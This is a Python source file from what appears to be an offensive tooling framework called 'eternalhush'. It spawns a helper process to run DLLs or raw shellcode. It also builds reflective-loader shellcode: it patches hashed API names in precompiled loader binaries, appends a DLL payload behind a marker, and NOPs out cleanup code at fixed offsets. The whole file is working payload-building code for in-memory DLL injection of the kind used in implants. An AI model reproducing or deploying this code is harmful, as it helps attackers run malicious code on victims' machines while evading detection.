import eternalhush as eh
import os
import subprocess

class HostProcess(object):
    def __init__(self, arch):
        self.arch = arch
        self.hp_path = os.path.join(eh.FILEDIR, "X"+arch[3:]+"_hostprocess.exe")
        return
    
    def spawn_sleep(self):
        process = subprocess.Popen([self.hp_path, '--mode', 'thread_sleep'])
        self.process = process
        return process
    
    def spawn_alertable(self):
        process = subprocess.Popen([self.hp_path, '--mode', 'alertable_thread'])
        self.process = process
        return process

    def spawn_dll(self, bin, export=-1):
        if isinstance(export, str):
            process = subprocess.Popen([self.hp_path, '--mode', 'dll', '--in', bin, '--export', export])
        elif isinstance(export, int):
            process = subprocess.Popen([self.hp_path, '--mode', 'dll', '--in', bin, '--ordinal', export])
        self.process = process
        return process
    
    def spawn_shellcode(self, bin):
        process = subprocess.Popen([self.hp_path, '--mode', 'shellcode', '--in', bin])
        self.process = process
        return process

class ReflectiveLoader(object):
    def _hash(self, data):
        __hash_seed = 7251

        for c in data:
            __hash_seed = ((__hash_seed << 6) + __hash_seed) + ord(c)
            
        return int(hex(__hash_seed)[-8:], 16)
        
    def __init__(self):
        self.target_arch = None
        self.dll = None
        self.export_name = None
        self.exitfunc = None
        self.nocleanup = None
        self.x86_buffer = open(eh.FILEDIR+"/reflectiveloader_x86.bin", "rb").read()
        self.x64_buffer = open(eh.FILEDIR+"/reflectiveloader_x64.bin", "rb").read()
        return
        
    def use_arch(self, s_arch):
        if not isinstance(s_arch, str):
            eh.ui.Echo("s_arch must be 'str'", eh.ECHO_ERROR)
            return
        self.target_arch = s_arch
        
    def add_dll(self, buffer_dll):
        if not isinstance(buffer_dll, bytes):
            eh.ui.Echo("buffer_dll must be 'bytes'", eh.ECHO_ERROR)
            return
        self.dll = buffer_dll
        
    def set_export_name(self, name):
        if not isinstance(name, str):
            eh.ui.Echo("name must be 'str'", eh.ECHO_ERROR)
            return
        self.export_name = name
    
    def set_exitfunc(self, name):
        if not isinstance(name, str):
            eh.ui.Echo("exitfunc must be 'str'", eh.ECHO_ERROR)
            return
        if name == "thread":
            self.exitfunc = "ExitThread"
        elif name == "process":
            self.exitfunc = "ExitProcess"
        else:
            eh.ui.Echo("invalid exitfunc specified", eh.ECHO_ERROR)
            return
        
    def set_nocleanup(self, state):
        if state:
            self.nocleanup = True
        else:
            self.nocleanup = False
    def nopsled(self, buffer, offset, size):
        for i in range(size):
            buffer[offset+i] = 0x90 
        return buffer 
    def build(self):
        if self.target_arch.lower() == "win64":
                temp_buffer = self.x64_buffer
        if self.target_arch.lower() == "win32":
                temp_buffer = self.x86_buffer
                
        if self.export_name != "RemoteCall":
            temp_buffer = temp_buffer.replace(self._hash("RemoteCall").to_bytes(4, "little"), self._hash(self.export_name).to_bytes(4, "little"))
            
        temp_buffer = temp_buffer.replace(self._hash("ExitProcess").to_bytes(4, "little"), self._hash(self.exitfunc).to_bytes(4, "little"))

        magic_const = b'\xef\xbe\xad\xde' #deadbeef
        temp_buffer += magic_const
        temp_buffer += len(self.dll).to_bytes(4, 'little')
        temp_buffer += self.dll
        if self.nocleanup:
            if self.target_arch.lower() != "win64":
                eh.ui.Echo("SiNi refldr error, nocleanup currently suported only on x64", eh.ECHO_ERROR)
                return
            temp_buffer = self.nopsled(bytearray(temp_buffer), 0xD91, 2)
            temp_buffer = self.nopsled(bytearray(temp_buffer), 0xDB8, 2)
            temp_buffer = self.nopsled(bytearray(temp_buffer), 0xDCA, 5)
            temp_buffer = self.nopsled(bytearray(temp_buffer), 0xDE4, 2)
        return temp_buffer